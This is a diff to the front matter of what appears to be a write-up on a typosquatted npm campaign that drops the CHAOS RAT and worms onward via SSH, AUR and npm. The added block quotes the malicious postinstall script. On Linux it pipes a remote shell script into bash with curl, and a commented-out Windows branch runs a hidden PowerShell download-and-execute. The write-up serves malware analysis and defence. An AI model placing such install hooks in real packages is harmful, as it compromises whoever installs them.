@@ -12,6 +12,17 @@ chain:
   - { step: "CHAOS RAT", note: "Remote access on the host", hot: true }
   - { step: "SSH · AUR · npm", note: "Worms onward to the next victim" }
 ships: 2 YARA rules
+artifact:
+  label: postinstall script
+  code: |-
+    const { exec } = require("child_process");
+    const { platform } = require('node:process');
+
+    if (process.platform === "linux") {
+            exec("curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh | bash", ()=>{});
+    } /*else if (process.platform === "win32") {
+            exec("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -Command iex ((New-Object System.Net.WebClient).DownloadString('https://example.com/windows.ps1'))", ()=>{});
+    }*/
 ---
 
 This campaign starts with a typo in `npm install`.
